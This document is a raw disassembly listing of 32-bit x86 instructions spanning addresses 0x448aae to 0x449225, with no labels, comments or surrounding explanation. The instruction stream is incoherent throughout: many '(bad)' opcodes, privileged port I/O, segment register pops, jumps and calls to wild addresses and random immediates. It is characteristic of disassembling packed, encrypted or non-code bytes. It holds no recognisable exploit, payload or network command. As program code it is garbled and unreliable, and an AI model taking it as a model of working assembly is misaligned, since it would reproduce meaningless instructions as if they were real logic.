  448aae:	mov    bh,0xfb
  448ab0:	sbb    BYTE PTR [ecx-0x5543d5b2],bh
  448ab6:	xchg   esi,eax
  448ab7:	or     bh,BYTE PTR ds:0x1efa3bb6
  448abd:	rol    BYTE PTR [ebx-0x2f],0xd2
  448ac1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448ac2:	inc    edx
  448ac3:	out    0x25,eax
  448ac5:	mov    DWORD PTR [edi-0x70947b1d],ebx
  448acb:	and    eax,0x264bbedc
  448ad0:	div    DWORD PTR [edx+0x75172b6f]
  448ad6:	push   ecx
  448ad7:	inc    ebp
  448ad8:	stc    
  448ad9:	cmp    DWORD PTR [edi+ebx*1],eax
  448adc:	jb     0x448a78
  448ade:	aas    
  448adf:	fnstenv cs:[eax+ebx*1-0x25]
  448ae4:	xchg   esp,eax
  448ae5:	push   edi
  448ae6:	scas   eax,DWORD PTR es:[edi]
  448ae7:	dec    edx
  448ae8:	sbb    dl,BYTE PTR [ecx+0x6f]
  448aeb:	stos   BYTE PTR es:[edi],al
  448aec:	rol    cl,1
  448aee:	cmp    al,0x7c
  448af0:	inc    edx
  448af1:	sub    DWORD PTR ds:0x8126ce4a,ebx
  448af7:	mov    dl,0xf3
  448af9:	and    eax,0xa79fef90
  448afe:	sti    
  448aff:	ins    DWORD PTR es:[edi],dx
  448b00:	mov    eax,ds:0x389ab00b
  448b05:	out    dx,eax
  448b06:	mov    edx,0xbb7243f1
  448b0b:	mov    ah,0x4a
  448b0d:	iret   
  448b0e:	jo     0x448b08
  448b10:	jne    0x448b6a
  448b12:	add    ch,bh
  448b14:	mov    ebx,0x640af903
  448b19:	push   ss
  448b1a:	sub    DWORD PTR [ebx],esi
  448b1c:	call   0xd419497e
  448b21:	mov    WORD PTR [edx+ebx*8],gs
  448b24:	add    eax,0x7af02874
  448b29:	clc    
  448b2a:	leave  
  448b2b:	xchg   dh,ah
  448b2d:	jp     0x448b49
  448b2f:	xchg   ebx,eax
  448b30:	pop    ss
  448b31:	and    ecx,edi
  448b33:	sbb    al,0x68
  448b35:	pop    ebx
  448b36:	sub    dh,BYTE PTR [ecx+0x35]
  448b39:	push   edx
  448b3a:	icebp  
  448b3b:	lock jbe 0x448bb3
  448b3e:	mov    cl,0xf1
  448b40:	push   ds
  448b41:	sub    edx,ecx
  448b43:	pop    ss
  448b44:	addr16 mov bl,0x22
  448b47:	cmp    dh,BYTE PTR [ecx]
  448b49:	mov    ds:0x36e233fb,eax
  448b4e:	push   ebx
  448b4f:	sub    ch,BYTE PTR [edi+0x38]
  448b52:	int    0x66
  448b54:	push   edi
  448b55:	adc    bh,BYTE PTR [ebp+0x3498e484]
  448b5b:	xor    al,0x56
  448b5d:	js     0x448b09
  448b5f:	and    BYTE PTR [eax],al
  448b61:	xchg   ebp,eax
  448b62:	cmp    ebp,DWORD PTR [ecx-0x204dc11c]
  448b68:	push   0x4d
  448b6a:	mov    edx,0x4aca6514
  448b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448b70:	aad    0xff
  448b72:	jmp    0x257ae95c
  448b77:	push   edx
  448b78:	sbb    DWORD PTR [ecx-0x4e],edi
  448b7b:	arpl   WORD PTR [di-0x46f4],si
  448b80:	or     esp,DWORD PTR [ebp+0x63c970bb]
  448b86:	cmovb  ebp,DWORD PTR [edx]
  448b89:	mul    bh
  448b8b:	(bad)  
  448b8c:	scas   al,BYTE PTR es:[edi]
  448b8d:	dec    edi
  448b8e:	mov    cl,0x34
  448b90:	dec    ebx
  448b91:	inc    ebx
  448b92:	pop    ebp
  448b93:	xchg   ecx,eax
  448b94:	xor    eax,0xf9f317b1
  448b99:	cmp    ah,BYTE PTR [ebp+0x3]
  448b9c:	push   ds
  448b9d:	jns    0x448b57
  448b9f:	dec    esp
  448ba0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448ba1:	inc    esi
  448ba2:	loopne 0x448bc3
  448ba4:	xchg   edx,eax
  448ba5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448ba6:	mov    ebx,DWORD PTR [ebx+0xe]
  448ba9:	std    
  448baa:	out    dx,eax
  448bab:	stc    
  448bac:	cwde   
  448bad:	aas    
  448bae:	sbb    ebx,eax
  448bb0:	xor    BYTE PTR [ecx],bh
  448bb2:	rcl    DWORD PTR [edx-0x8],cl
  448bb5:	out    dx,eax
  448bb6:	les    esp,FWORD PTR [esi+0x71b6bb21]
  448bbc:	lea    esp,[ebx+edi*8-0x37ab8c3b]
  448bc3:	outs   dx,BYTE PTR ds:[esi]
  448bc4:	xor    al,0x55
  448bc6:	and    BYTE PTR [edi-0x7a65f97f],0x59
  448bcd:	(bad)  
  448bce:	pop    esi
  448bcf:	jmp    0x448c15
  448bd1:	lea    edi,[ebp-0x72]
  448bd4:	mov    ch,0x10
  448bd6:	fsubr  DWORD PTR [edi+eiz*4]
  448bd9:	mov    eax,ds:0x65afb630
  448bde:	out    dx,eax
  448bdf:	mov    ds:0xd698b914,eax
  448be4:	sub    eax,DWORD PTR [edi]
  448be6:	mov    bl,0x48
  448be8:	js     0x448b92
  448bea:	sub    esp,DWORD PTR [eax-0x766579ed]
  448bf0:	adc    al,BYTE PTR [ebx]
  448bf2:	mov    dh,0x5c
  448bf4:	push   edx
  448bf5:	sahf   
  448bf6:	mov    edx,0x1fa97004
  448bfb:	jmp    0x448c32
  448bfd:	jns    0x448c70
  448bff:	repnz leave 
  448c01:	(bad)  
  448c02:	or     edi,DWORD PTR [edx+0x6ea01925]
  448c08:	sbb    DWORD PTR [esi],esi
  448c0a:	add    DWORD PTR [esi],0x58
  448c0d:	fistp  WORD PTR [ecx]
  448c0f:	mov    WORD PTR [esi+0x28],es
  448c12:	(bad)  
  448c13:	pop    ecx
  448c14:	jp     0x448bbe
  448c16:	sub    eax,0xbe757d28
  448c1b:	out    dx,eax
  448c1c:	pop    ds
  448c1d:	adc    esi,DWORD PTR [esi+0x72335af4]
  448c23:	(bad)  
  448c24:	retf   0x7097
  448c27:	scas   eax,DWORD PTR es:[edi]
  448c28:	jp     0x448c71
  448c2a:	mov    ebp,0x766e6ce4
  448c2f:	mov    bl,0xc3
  448c31:	out    0x2b,al
  448c33:	add    eax,0xcb2ee286
  448c38:	and    al,ah
  448c3a:	and    edi,DWORD PTR ds:0x689ba895
  448c40:	popa   
  448c41:	js     0x448cba
  448c43:	jp     0x448c0c
  448c45:	call   0x4696984b
  448c4a:	mov    ecx,0x62395524
  448c4f:	sbb    esi,DWORD PTR [esi+0x61]
  448c52:	shl    DWORD PTR [ebx+0x1e],1
  448c55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448c56:	dec    edi
  448c57:	ret    0x42da
  448c5a:	xor    al,0x5d
  448c5c:	sahf   
  448c5d:	mov    dl,0xbc
  448c5f:	and    al,0x38
  448c61:	outs   dx,DWORD PTR ds:[esi]
  448c62:	sti    
  448c63:	mov    ah,0x36
  448c65:	add    eax,0xfb951bdc
  448c6a:	(bad)  
  448c6b:	js     0x448c02
  448c6d:	test   al,0xdb
  448c6f:	sahf   
  448c70:	xcrypt-cfb (bad)
  448c71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448c72:	daa    
  448c73:	xor    ebp,esi
  448c75:	push   0x1a
  448c77:	icebp  
  448c78:	scas   al,BYTE PTR es:[edi]
  448c79:	or     esp,ebp
  448c7b:	push   ecx
  448c7c:	in     eax,0xec
  448c7e:	jge    0x448c2c
  448c80:	or     DWORD PTR [edi+0x5e],edi
  448c83:	mov    edx,0x7a8a7cb7
  448c88:	mov    edi,0xd6f1b30d
  448c8d:	cdq    
  448c8e:	jnp    0x448c60
  448c90:	clc    
  448c91:	mov    dl,0x55
  448c93:	in     al,0x43
  448c95:	(bad)  
  448c96:	je     0x448c26
  448c98:	pop    ebp
  448c99:	mov    al,0xbb
  448c9b:	xor    al,0x6f
  448c9d:	int    0x31
  448c9f:	or     al,0xc5
  448ca1:	sbb    al,0xa9
  448ca3:	out    0x20,al
  448ca5:	adc    BYTE PTR [ecx+0x63ae9e11],bh
  448cab:	jge    0x448cd2
  448cad:	in     eax,dx
  448cae:	repnz sti 
  448cb0:	stc    
  448cb1:	inc    edi
  448cb2:	jmp    0x448c34
  448cb4:	inc    edi
  448cb5:	push   ss
  448cb6:	mov    esp,0x9a962ad1
  448cbb:	push   esp
  448cbc:	aaa    
  448cbd:	js     0x448ca9
  448cbf:	call   0xf88265e2
  448cc4:	daa    
  448cc5:	push   ebp
  448cc6:	addr16 ffreep st(2)
  448cc9:	mov    ebp,0x8df6a2aa
  448cce:	in     al,dx
  448ccf:	fsubrp st(6),st
  448cd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448cd2:	out    dx,eax
  448cd3:	sub    DWORD PTR [edi],0x1fbc7d68
  448cd9:	cmp    DWORD PTR [esi-0x65749279],ebp
  448cdf:	xchg   esi,eax
  448ce0:	sbb    eax,0xd8ff0c97
  448ce5:	cmp    DWORD PTR [edi],ebx
  448ce7:	pusha  
  448ce8:	jle    0x448d02
  448cea:	mov    bl,0xea
  448cec:	sbb    al,0x49
  448cee:	cmp    BYTE PTR [ebp-0x80],dh
  448cf1:	fmul   QWORD PTR [eax+0x5]
  448cf4:	ins    BYTE PTR es:[edi],dx
  448cf5:	fwait
  448cf6:	retf   
  448cf7:	out    0xc8,al
  448cf9:	push   cs
  448cfa:	ins    BYTE PTR es:[edi],dx
  448cfb:	xchg   esi,eax
  448cfc:	fisttp DWORD PTR [edx]
  448cfe:	xchg   esp,eax
  448cff:	stos   BYTE PTR es:[edi],al
  448d00:	bound  edx,QWORD PTR ds:0x96fca4ba
  448d06:	mov    BYTE PTR [edx*4-0x14174796],0xe3
  448d0e:	test   eax,0x4f391e5d
  448d13:	push   esi
  448d14:	stc    
  448d15:	mov    esi,0x616a36a7
  448d1a:	fcmovne st,st(3)
  448d1c:	pop    es
  448d1d:	(bad)  
  448d1e:	ror    dh,cl
  448d20:	stc    
  448d21:	mov    bh,0x18
  448d23:	jmp    0xb7428183
  448d28:	inc    esi
  448d29:	pop    ecx
  448d2a:	cmp    eax,0x354cb540
  448d2f:	gs push ds
  448d31:	loope  0x448d99
  448d33:	cmp    eax,0xba6b9ccf
  448d38:	fadd   QWORD PTR [esi-0x42]
  448d3b:	xor    BYTE PTR [ecx+0x67],0x77
  448d3f:	xchg   edi,eax
  448d40:	or     esp,DWORD PTR [edx-0x5ebf775d]
  448d46:	enter  0x8f58,0xc
  448d4a:	cld    
  448d4b:	xor    edx,DWORD PTR [ecx]
  448d4d:	sti    
  448d4e:	or     esp,DWORD PTR [edi+0x15]
  448d51:	int    0xdb
  448d53:	jmp    0x448dcc
  448d55:	sbb    cl,BYTE PTR ds:0xc269ce8a
  448d5b:	or     eax,0xea7aa695
  448d60:	mov    ah,0xa2
  448d62:	mov    ecx,esi
  448d64:	push   ebx
  448d65:	std    
  448d66:	adc    dh,dh
  448d68:	mov    eax,0x250acd6b
  448d6d:	push   0xffffffb0
  448d6f:	hlt    
  448d70:	and    bh,bl
  448d72:	dec    ebp
  448d73:	jns    0x448daa
  448d75:	mov    eax,0x8e7ce6f9
  448d7a:	sub    DWORD PTR [ebp+0x1a],ebx
  448d7d:	mov    al,ds:0x2721e588
  448d82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448d83:	mov    dh,0xf1
  448d85:	adc    bh,BYTE PTR [esp+ebp*4+0x5ce3197a]
  448d8c:	inc    ebp
  448d8d:	in     al,dx
  448d8e:	mov    ebx,ebp
  448d90:	lods   eax,DWORD PTR ds:[esi]
  448d91:	inc    ecx
  448d92:	mov    al,ds:0x77691e5c
  448d97:	add    DWORD PTR [ecx+0x57],eax
  448d9a:	jo     0x448de0
  448d9c:	shl    DWORD PTR [ecx-0x16edafd5],cl
  448da2:	or     BYTE PTR ds:0xcc7b5f43,0x52
  448da9:	or     DWORD PTR [ecx+ebp*4-0x2398b96c],esi
  448db0:	pop    ds
  448db1:	idiv   DWORD PTR [ecx]
  448db3:	aad    0x46
  448db5:	sub    al,0xdf
  448db7:	int    0x89
  448db9:	stc    
  448dba:	cmp    al,BYTE PTR [ecx-0x6f125ca5]
  448dc0:	mov    cl,0x53
  448dc2:	lds    edi,FWORD PTR [edi+0x5d]
  448dc5:	test   DWORD PTR [edi],ebp
  448dc7:	in     eax,0x33
  448dc9:	(bad)  
  448dca:	cdq    
  448dcb:	mov    dh,0x1c
  448dcd:	fist   WORD PTR [ebx+0x69]
  448dd0:	push   ebp
  448dd1:	pop    ebx
  448dd2:	outs   dx,BYTE PTR ds:[esi]
  448dd3:	in     al,dx
  448dd4:	inc    ebp
  448dd5:	cs mov esp,0x2f9a01cb
  448ddb:	ret    
  448ddc:	push   esp
  448ddd:	and    al,0xe7
  448ddf:	or     BYTE PTR [edx+0x5f],bl
  448de2:	jp     0x448dd6
  448de4:	jne    0x448da9
  448de6:	enter  0xf0,0x7f
  448dea:	cmp    bl,BYTE PTR [esi]
  448dec:	push   cs
  448ded:	push   0x5c
  448def:	dec    ebx
  448df0:	imul   esp,DWORD PTR [ecx+ebx*2-0x7954cd92],0x6e38a51a
  448dfb:	in     al,dx
  448dfc:	sub    cl,BYTE PTR [ecx]
  448dfe:	cs in  al,dx
  448e00:	mov    bl,0xbc
  448e02:	fwait
  448e03:	cld    
  448e04:	push   ebp
  448e05:	dec    esi
  448e06:	mov    al,ds:0x896498e9
  448e0b:	sub    al,0x69
  448e0d:	pusha  
  448e0e:	mov    cs:0xd4bb81c8,al
  448e14:	mov    ds:0x7dd37fec,al
  448e19:	addr16 mov ch,0xe4
  448e1c:	jp     0x448de3
  448e1e:	xor    BYTE PTR [esi],cl
  448e20:	aaa    
  448e21:	mov    esp,0xf456bc3d
  448e26:	stc    
  448e27:	push   esi
  448e28:	jno    0x448dbe
  448e2a:	or     esp,ebp
  448e2c:	or     ebx,DWORD PTR [edx-0x5a551c7b]
  448e32:	xor    ebx,DWORD PTR [edx]
  448e34:	cmc    
  448e35:	add    DWORD PTR [edx],edi
  448e37:	adc    DWORD PTR ds:0xcde70c25,edx
  448e3d:	loopne 0x448e1a
  448e3f:	sbb    eax,0x41028109
  448e44:	xor    ah,dl
  448e46:	leave  
  448e47:	fs mov esp,0xe6deab37
  448e4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448e4e:	mov    ebx,0x978efbe7
  448e53:	rcr    DWORD PTR [edx],0xe4
  448e56:	xor    eax,0x7b43eee9
  448e5b:	push   esi
  448e5c:	push   edi
  448e5d:	test   eax,0x9a2a6cbe
  448e62:	jnp    0x448e64
  448e64:	in     al,dx
  448e65:	and    DWORD PTR [ebx],edx
  448e67:	inc    edi
  448e68:	mov    cl,0x34
  448e6a:	test   eax,0xb0334a34
  448e6f:	xor    al,0x43
  448e71:	std    
  448e72:	push   ss
  448e73:	in     al,dx
  448e74:	cmp    bh,BYTE PTR es:[ecx-0x1f]
  448e78:	and    BYTE PTR [ebx+0x52],bh
  448e7b:	mov    esi,0x10537865
  448e80:	cld    
  448e81:	inc    edi
  448e82:	das    
  448e83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448e84:	push   edx
  448e85:	adc    eax,0xea527d98
  448e8a:	pusha  
  448e8b:	jae    0x448ec3
  448e8d:	shl    DWORD PTR [esi+0x1b],cl
  448e90:	outs   dx,BYTE PTR ds:[esi]
  448e91:	imul   esi,ecx,0xffffffa2
  448e94:	out    0x3c,al
  448e96:	mov    ah,0xc2
  448e98:	mov    edx,0x5054be86
  448e9d:	dec    edx
  448e9e:	xor    edi,DWORD PTR [edx]
  448ea0:	cmc    
  448ea1:	fldcw  WORD PTR [ebp-0x19]
  448ea4:	sbb    BYTE PTR [edx-0x34],0xc8
  448ea8:	adc    cl,dl
  448eaa:	adc    eax,0xf1822604
  448eaf:	dec    edi
  448eb0:	outs   dx,DWORD PTR ds:[esi]
  448eb1:	jecxz  0x448e67
  448eb3:	push   0xbaa7abe
  448eb8:	push   ss
  448eb9:	dec    esi
  448eba:	enter  0x22d5,0x5d
  448ebe:	mov    ch,0x65
  448ec0:	lds    ebx,FWORD PTR [eax-0x23]
  448ec3:	inc    cx
  448ec5:	ins    DWORD PTR es:[edi],dx
  448ec6:	sub    ch,al
  448ec8:	xchg   edx,eax
  448ec9:	dec    edx
  448eca:	inc    esi
  448ecb:	jbe    0x448ec2
  448ecd:	pop    ecx
  448ece:	mov    bl,0xb8
  448ed0:	sub    eax,0xf6d03ae0
  448ed5:	cmc    
  448ed6:	sbb    edx,DWORD PTR [edi+0x6c]
  448ed9:	popf   
  448eda:	fdiv   DWORD PTR [edx]
  448edc:	in     eax,dx
  448edd:	inc    esp
  448ede:	xor    ecx,DWORD PTR [ebx]
  448ee0:	pop    edi
  448ee1:	push   ebp
  448ee2:	and    edx,DWORD PTR [ebp-0xab6cfde]
  448ee8:	(bad)  
  448ee9:	cmp    al,0x63
  448eeb:	mov    ds:0xe4d00d75,eax
  448ef0:	fwait
  448ef1:	adc    BYTE PTR [esi],dh
  448ef3:	gs pop ds
  448ef5:	or     DWORD PTR [eax-0x12],ecx
  448ef8:	pop    es
  448ef9:	dec    edi
  448efa:	inc    edx
  448efb:	add    BYTE PTR [esi],cl
  448efd:	adc    al,0xbc
  448eff:	jmp    0x9d7c705c
  448f04:	outs   dx,BYTE PTR ds:[esi]
  448f05:	aam    0x2e
  448f07:	jmp    0x448f02
  448f09:	test   eax,0xa2b8adf1
  448f0e:	adc    esp,esi
  448f10:	push   ss
  448f11:	ins    DWORD PTR es:[edi],dx
  448f12:	pop    esi
  448f13:	test   al,0xbb
  448f15:	shl    BYTE PTR ds:0x2e79fde9,0x18
  448f1c:	(bad)  
  448f1d:	sar    BYTE PTR [ebx-0x9],1
  448f20:	into   
  448f21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448f22:	mov    bl,0xc4
  448f24:	pop    ebx
  448f25:	popf   
  448f26:	sub    ebp,DWORD PTR [edi]
  448f28:	int    0xd
  448f2a:	jge    0x448ef5
  448f2c:	xlat   BYTE PTR ds:[ebx]
  448f2d:	faddp  st(7),st
  448f2f:	and    BYTE PTR [eax+ebx*2-0x6c],ah
  448f33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448f34:	jno    0x448eda
  448f36:	fsubr  st,st(2)
  448f38:	mov    edx,0x3a5abb6
  448f3d:	fmul   st(5),st
  448f3f:	jno    0x448f5f
  448f41:	inc    ebp
  448f42:	push   cs
  448f43:	into   
  448f44:	push   edi
  448f45:	jmp    0xbdb75f05
  448f4a:	or     eax,0xbd637d86
  448f4f:	repz sbb al,0x19
  448f52:	pop    ebp
  448f53:	or     DWORD PTR [edi-0x22],0x47
  448f57:	and    eax,0xd01bc98e
  448f5c:	or     bl,BYTE PTR [edx-0x3c]
  448f5f:	sbb    ecx,ebp
  448f61:	in     al,0xfb
  448f63:	mov    ah,BYTE PTR [edx+0x1be16215]
  448f69:	sbb    ebp,ebx
  448f6b:	mov    ds:0x80799d65,al
  448f70:	cmp    BYTE PTR [ecx],ah
  448f72:	push   ebx
  448f73:	cmp    dl,ch
  448f75:	xchg   edi,eax
  448f76:	mov    ds:0x1dc1a0e5,eax
  448f7b:	je     0x448faa
  448f7d:	cmp    eax,esp
  448f7f:	(bad)  
  448f80:	pop    eax
  448f81:	ss int3 
  448f83:	jne    0x448f5c
  448f85:	call   0xfa9a2bd0
  448f8a:	xchg   edx,eax
  448f8b:	out    dx,al
  448f8c:	stos   DWORD PTR es:[edi],eax
  448f8d:	cli    
  448f8e:	fisttp QWORD PTR [edi+edi*8]
  448f91:	cmp    DWORD PTR [eax],esi
  448f93:	fnsave [eiz*4-0x3f6781c9]
  448f9a:	lods   al,BYTE PTR ds:[esi]
  448f9b:	mov    ah,0x66
  448f9d:	std    
  448f9e:	pop    ebx
  448f9f:	in     al,0x10
  448fa1:	ret    0xb380
  448fa4:	xchg   ebx,eax
  448fa5:	lahf   
  448fa6:	mov    ch,0x6e
  448fa8:	cmp    DWORD PTR [edi+0x309e21a5],esi
  448fae:	mov    eax,0xaeda84f4
  448fb3:	in     al,0x7a
  448fb5:	xchg   edi,eax
  448fb6:	lods   eax,DWORD PTR ds:[esi]
  448fb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448fb8:	jnp    0x449006
  448fba:	mov    ah,0x74
  448fbc:	xchg   esi,eax
  448fbd:	push   esi
  448fbe:	xchg   edx,eax
  448fbf:	pop    edx
  448fc0:	xchg   ecx,eax
  448fc1:	mov    esi,0x63cbe4b7
  448fc6:	and    DWORD PTR [eax*4+0x71ea6f96],ecx
  448fcd:	stos   BYTE PTR es:[edi],al
  448fce:	les    esp,FWORD PTR [ecx]
  448fd0:	lea    ebp,[ecx]
  448fd2:	mov    cl,0x19
  448fd4:	pop    ss
  448fd5:	je     0x448f70
  448fd7:	and    eax,0x80bc7848
  448fdc:	add    BYTE PTR [eax+0x5b91ed1b],ch
  448fe2:	sti    
  448fe3:	stc    
  448fe4:	sahf   
  448fe5:	mov    esi,0x4628b6fb
  448fea:	jecxz  0x448fd0
  448fec:	xor    ebx,DWORD PTR [edx]
  448fee:	xlat   BYTE PTR ds:[ebx]
  448fef:	push   ss
  448ff0:	pop    ecx
  448ff1:	jp     0x448f8f
  448ff3:	or     DWORD PTR [ebp+0x23dde36e],0x5224e622
  448ffd:	cwde   
  448ffe:	mov    ebp,0xb7730360
  449003:	mov    ah,0x80
  449005:	sahf   
  449006:	lods   al,BYTE PTR ds:[esi]
  449007:	mov    edx,0xe4cebca5
  44900c:	pop    ebx
  44900d:	push   esp
  44900e:	add    eax,0x6797987d
  449013:	cmp    ecx,ecx
  449015:	out    dx,al
  449016:	mov    edx,0x740f8014
  44901b:	mov    bh,0x5
  44901d:	imul   ecx,DWORD PTR [ebp-0x11],0xffffff93
  449021:	clc    
  449022:	pop    esp
  449023:	pop    ds
  449024:	(bad)  
  449025:	test   al,0x5
  449027:	sub    ebp,DWORD PTR [ecx+0x16]
  44902a:	mov    edi,0xd893fce4
  44902f:	pop    esi
  449030:	aad    0x26
  449032:	push   ecx
  449033:	icebp  
  449034:	clc    
  449035:	loopne 0x448fe2
  449037:	gs pop ds
  449039:	stc    
  44903a:	push   esp
  44903b:	add    eax,0xfbed4db4
  449040:	ret    
  449041:	push   ds
  449042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449043:	cmp    al,BYTE PTR [ebp+0x7ef10bca]
  449049:	jecxz  0x449036
  44904b:	dec    eax
  44904c:	pop    ds
  44904d:	pop    ecx
  44904e:	mov    al,0x2e
  449050:	xor    DWORD PTR [edi-0x5e],0x12
  449054:	fistp  DWORD PTR [edx-0x6f217a65]
  44905a:	and    bl,BYTE PTR [eax-0x68]
  44905d:	push   cs
  44905e:	mov    ebp,DWORD PTR [esi]
  449060:	xchg   edx,eax
  449061:	mov    edx,0xb2c0879a
  449066:	mov    edx,0x2c564634
  44906b:	test   eax,0x2568db79
  449070:	sahf   
  449071:	(bad)  
  449072:	mov    ebx,0xe1e98c54
  449077:	outs   dx,DWORD PTR ds:[esi]
  449078:	das    
  449079:	jmp    0xaf4e7743
  44907e:	mov    cl,0xc5
  449080:	test   esi,ecx
  449082:	pushf  
  449083:	out    dx,eax
  449084:	add    al,0x31
  449086:	int3   
  449087:	inc    edx
  449088:	and    BYTE PTR [ecx-0x5e],ch
  44908b:	mov    ?,WORD PTR [eax+ecx*2+0x4a09bcc]
  449092:	fisttp QWORD PTR [edi+0x5f]
  449095:	mov    al,ds:0x97a2248b
  44909a:	outs   dx,BYTE PTR ds:[esi]
  44909b:	inc    ecx
  44909c:	scas   al,BYTE PTR es:[edi]
  44909d:	mov    esp,0xdfe5b839
  4490a2:	xchg   cl,ch
  4490a4:	and    esi,DWORD PTR [edx+0x2ef9a6d8]
  4490aa:	pop    ds
  4490ab:	fcom   QWORD PTR [ecx+ebx*4-0x5a616a60]
  4490b2:	and    al,0x6d
  4490b4:	jno    0x449113
  4490b6:	(bad)  
  4490b7:	xchg   ebp,eax
  4490b8:	lea    edi,ds:0x306604bb
  4490be:	mov    dl,0xc7
  4490c0:	div    DWORD PTR [ecx-0x21]
  4490c3:	ret    
  4490c4:	sbb    eax,ecx
  4490c6:	xor    ch,ch
  4490c8:	dec    esp
  4490c9:	jbe    0x449107
  4490cb:	(bad)  
  4490cc:	mov    dl,0x61
  4490ce:	mov    bh,0xb4
  4490d0:	xchg   edx,eax
  4490d1:	jo     0x4490aa
  4490d3:	loopne 0x44914a
  4490d5:	dec    edx
  4490d6:	addr16 in eax,0xed
  4490d9:	out    dx,eax
  4490da:	sbb    esi,ecx
  4490dc:	pop    ss
  4490dd:	pop    ecx
  4490de:	jmp    0xceb7cff
  4490e3:	mov    eax,ds:0x986b9e9e
  4490e8:	arpl   WORD PTR [esi-0xa],cx
  4490eb:	sub    al,BYTE PTR [ebp-0x54]
  4490ee:	gs mov cl,0x7a
  4490f1:	lock mov esp,0x9f0edff4
  4490f7:	stos   BYTE PTR es:[edi],al
  4490f8:	xor    eax,0x1dead486
  4490fd:	pmaxsw mm1,QWORD PTR [ecx+0xebaa91a]
  449104:	pop    es
  449105:	aam    0x37
  449107:	test   DWORD PTR [eax],esi
  449109:	test   eax,0xb0cafefb
  44910e:	mov    bh,0xe6
  449110:	dec    esi
  449111:	test   BYTE PTR [ecx],ch
  449113:	(bad)  
  449114:	shl    DWORD PTR [ebp-0x7b],1
  449117:	hlt    
  449118:	in     eax,0x14
  44911a:	add    esi,esp
  44911c:	push   es
  44911d:	(bad)  
  44911f:	fild   DWORD PTR [esi+0x79]
  449122:	dec    esi
  449123:	les    ebp,FWORD PTR [eax]
  449125:	idiv   DWORD PTR [edi+0x8]
  449128:	cs adc eax,0x96f5f2e9
  44912e:	push   0xfffffffc
  449130:	lods   eax,DWORD PTR ds:[esi]
  449131:	ins    BYTE PTR es:[edi],dx
  449132:	push   0xc1a37a36
  449137:	pop    ecx
  449138:	lock sbb cl,BYTE PTR [ecx]
  44913b:	and    DWORD PTR [esi+0x6b],esi
  44913e:	mov    ch,0x64
  449140:	push   edi
  449141:	xor    ecx,esi
  449143:	shl    ch,1
  449145:	fidiv  WORD PTR [ebx-0x12]
  449148:	add    dh,BYTE PTR [edi]
  44914a:	dec    ecx
  44914b:	push   ecx
  44914c:	aas    
  44914d:	push   edi
  44914e:	mov    ecx,0x78fa01f8
  449153:	mov    ah,0x6e
  449155:	stos   BYTE PTR es:[edi],al
  449156:	(bad)  
  449157:	fistp  DWORD PTR [ebx+edi*8-0x16]
  44915b:	into   
  44915c:	ret    
  44915d:	mov    al,ds:0x17f0f7bb
  449162:	push   esi
  449163:	lahf   
  449164:	jl     0x4490ff
  449166:	nop
  449167:	mov    esi,DWORD PTR gs:[eax-0x7b4bb48]
  44916e:	fild   DWORD PTR [ebp-0xce5755b]
  449174:	adc    ah,BYTE PTR [edi]
  449176:	add    eax,0x2ce919e2
  44917b:	fistp  WORD PTR [ecx-0x6e]
  44917e:	ins    DWORD PTR es:[edi],dx
  44917f:	jno    0x44914d
  449181:	cmp    DWORD PTR [ebx+ebp*2+0x48f87bc],0xffffffaa
  449189:	cdq    
  44918a:	sub    dh,BYTE PTR [ecx]
  44918c:	mov    bl,BYTE PTR [eax+0x44]
  44918f:	and    DWORD PTR [edi+0x10],ecx
  449192:	mov    ebp,0x47720554
  449197:	xchg   edi,eax
  449198:	push   ebp
  449199:	notrack call DWORD PTR [eax-0x1ae56db9]
  4491a0:	mov    dh,0x9c
  4491a2:	cdq    
  4491a3:	loop   0x4491d3
  4491a5:	scas   al,BYTE PTR es:[edi]
  4491a6:	mov    esi,0xd299f608
  4491ab:	mov    dl,0xb8
  4491ad:	popf   
  4491ae:	xor    ebp,DWORD PTR [eax-0xf]
  4491b1:	fnstcw WORD PTR [ebx+0x77]
  4491b4:	adc    eax,0x9cf1a3d2
  4491b9:	jmp    FWORD PTR [ecx]
  4491bb:	mulps  xmm3,xmm0
  4491be:	mov    ebx,0xba30b0d3
  4491c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4491c4:	(bad)  
  4491c5:	mov    ss,WORD PTR [ebx+0x6d]
  4491c8:	lds    ecx,FWORD PTR [edi]
  4491ca:	add    cl,ch
  4491cc:	xor    BYTE PTR [ecx-0x56],0xb1
  4491d0:	xor    al,0x89
  4491d2:	dec    edi
  4491d3:	cmp    dh,dl
  4491d5:	cmp    DWORD PTR [esi+0x47],ebp
  4491d8:	and    bl,al
  4491da:	or     eax,0x20b16787
  4491df:	stos   BYTE PTR es:[edi],al
  4491e0:	adc    DWORD PTR [eax],esi
  4491e2:	stos   DWORD PTR es:[edi],eax
  4491e3:	hlt    
  4491e4:	shl    bh,cl
  4491e6:	inc    ecx
  4491e7:	adc    eax,0xb4bd4ed8
  4491ec:	(bad)  
  4491ed:	xor    BYTE PTR [ecx+0x37],bl
  4491f0:	aaa    
  4491f1:	repz jns 0x4491b8
  4491f4:	fst    DWORD PTR [eax]
  4491f6:	cs out 0x66,al
  4491f9:	inc    ecx
  4491fa:	pop    ds
  4491fb:	or     dh,bh
  4491fd:	xchg   esi,eax
  4491fe:	ret    
  4491ff:	fs jo  0x4491df
  449202:	pop    ebx
  449203:	out    0x28,eax
  449205:	mov    ds:0x994611f6,eax
  44920a:	adc    eax,0xc6f77a1e
  44920f:	jns    0x4491f4
  449211:	or     DWORD PTR [ebx],esi
  449213:	push   ds
  449214:	lahf   
  449215:	repnz mov edx,0xb306e934
  44921b:	inc    ebx
  44921c:	cmc    
  44921d:	fist   WORD PTR [ebp-0x54c6860c]
  449223:	int    0xf9
  449225:	leave  
